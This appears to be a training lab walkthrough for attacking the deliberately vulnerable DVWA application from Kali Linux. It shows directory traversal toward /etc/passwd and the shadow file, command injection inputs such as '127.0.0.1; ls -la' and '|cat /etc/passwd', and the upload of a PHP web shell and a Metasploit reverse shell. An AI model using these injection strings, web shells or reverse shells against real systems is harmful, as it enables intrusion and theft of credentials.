...
Launch the Firefox browser by selecting the Firefox ESR icon in the Kali top icon menu.

Maximize the Firefox window.

In the Firefox address bar, enter dvwa.structureality.com

If prompted, type admin and password into the Username and Password fields, respectively, then select Login.
...
Notice the URL displayed in the Firefox address bar:

dvwa.structureality.com/vulnerabilities/fi/?page=include.php
Modify the URL to add "blah/" into the URL as follows:
...
Modify the URL to attempt to access the "etc/passwd" file as follows:
...
Modify the URL to attempt to access the "/etc/passwd" file using a change to parent instruction as follows:
...
Add additional "../" in front of the etc directory reference to create a relative reference URL to view the passwd file.
...
6
7
Attempt to access the shadow file using the following URL:
...
Determine the OS version through directory traversal by accessing the version file from the /proc directory using the following URL:
...
Return to the web browser focused on DVWA.

In the left-side navigation menu bar, select Command Injection.

The Vulnerability: Command Injection page should be displayed.

Type 10.1.16.66 into the Enter an IP address field, then select Submit.
...
Type 127.0.0.1; ls -la into the Enter an IP address field, then select Submit to test to see if a command injection will work.
...
Type 127.0.0.1 && cat index.php then select Submit.
...
Type ; ls -la source then select Submit.
...
Type ; whoami; hostname; ip a; pwd; uptime then select Submit.
...
jaime
172.16.0.201
Type the following into the Enter an IP address field, then select Submit.
...
Type |cat /etc/passwd then select Submit.
...
In the left-side navigation menu bar, select File Upload.

The Vulnerability: File Upload page should be displayed.

Open a Terminal window.

Enter pwd to confirm you are in the /root directory.

Enter cp /usr/share/xsser/gtk/images/world.png world.png
...
Enter ls -l to confirm world.png is present in the /root directory.

Minimize the Terminal window and switch back to the web browser.

On the Vulnerability: File Upload page, select Browse….

Select Home, then double-click world.png.

Select Upload.

You should see the result of ../../hackable/uploads/world.png successfully uploaded!.

Modify the URL in the Firefox address bar using this uploaded file path so that the URL is as below, then press ENTER:
...
Enter cat special.php to view the contents of this file.

Confirm the code is accurate. If not, repeat the vim command to re-open and correct it.

Minimize the Terminal window and switch back to the web browser.

Select the Go back one page left-arrow button on the Firefox toolbar.

The Vulnerability: File Upload page should be displayed.

Select Browse….

Double-click special.php.

If you are not shown the last used folder (i.e., /root), select Home.

Select Upload.

You should see the result of ../../hackable/uploads/special.php successfully uploaded!.
...
Modify the URL in the Firefox address bar using this uploaded file path so that the URL is as shown below, then press ENTER:
...
Modify the URL of http://dvwa.structureality.com/hackable/uploads/special.php to add ?cmd=ls to the end so that it reads as the following, then press ENTER.

http://dvwa.structureality.com/hackable/uploads/special.php?cmd=ls
You should see the filenames of dvwa_email.png, special.php, and world.png.

Other files may be present in addition to these three.

Change the injected command in the URL to pwd.

You should see the directory name of /var/www/dvwa.structureality.com/public_html/hackable/uploads.

Craft and try command injection URLs for each of the following:
...
It may take up to 30 seconds before the command completes. However, when it does, it will display the following:
...
Enter ls -l to confirm the existence of shell.php.

Select the Score button to validate this task:

Use Metasploit to create a listener to receive the reverse shell using the following commands:
...
On the File Upload window, select shell.php from the right pane, then select Open.

You are returned to Firefox, showing the Vulnerability: File Upload page.

Select Upload.

You should see the message ../../hackable/uploads/shell.php successfully uploaded!.
...
In the Firefox address bar, enter dvwa.structureality.com/hackable/uploads/shell.php
...
You should now see the statement "Meterpreter session 1 opened" and a prompt of "meterpreter >".
...
...less
Enter sysinfo to view details about the victim system

Enter getuid to reveal the user account privileges context.

What is the account privileges context for the established web shell?

Enter help to view a list of other commands supported by the PHP meterpreter shell.
...
You can experiment with some of the available commands.

Enter exit to terminate the reverse web shell connection.
